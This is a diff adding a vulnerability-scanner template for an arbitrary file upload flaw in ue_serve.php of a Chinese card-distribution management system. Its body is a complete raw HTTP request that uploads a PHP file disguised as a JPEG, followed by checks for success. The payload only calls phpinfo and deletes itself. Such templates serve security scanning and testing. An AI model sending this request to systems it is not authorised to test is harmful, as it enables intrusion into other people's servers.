@@ -1,0 +1,43 @@
+id: hkjtfxglxt_ue_serve.php_uploadfile
+
+info:
+  name: 号卡极团分销管理系统 ue_serve.php 任意文件上传
+  author: onewin
+  severity: high
+  description: 号卡极团分销管理系统 ue_serve.php 任意文件上传
+  reference:
+  - https://github.com/
+  - https://cve.mitre.org/
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - "@timeout: 30s\nPOST /admin/controller/ue_serve.php?action=image&encode=utf-8
+    HTTP/2\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36\nContent-Type:
+    multipart/form-data; boundary=----WebKitFormBoundarylkv1kpsZgzw2WC03\nAccept:
+    */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nContent-Length:
+    316\n\n------WebKitFormBoundarylkv1kpsZgzw2WC03\nContent-Disposition: form-data;
+    name=\"name\"\n \n404.php\n------WebKitFormBoundarylkv1kpsZgzw2WC03\nContent-Disposition:
+    form-data; name=\"upfile\"; filename=\"404.php\"\nContent-Type: image/jpeg\n \n<?php
+    phpinfo();unlink(__FILE__);?>\n------WebKitFormBoundarylkv1kpsZgzw2WC03--"
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+  - id: 1
+    type: word
+    part: body
+    words:
+    - SUCCESS
+    condition: and
+
+  - id: 1
+    type: status
+    part: status
+    status:
+    - "200"
+    condition: and
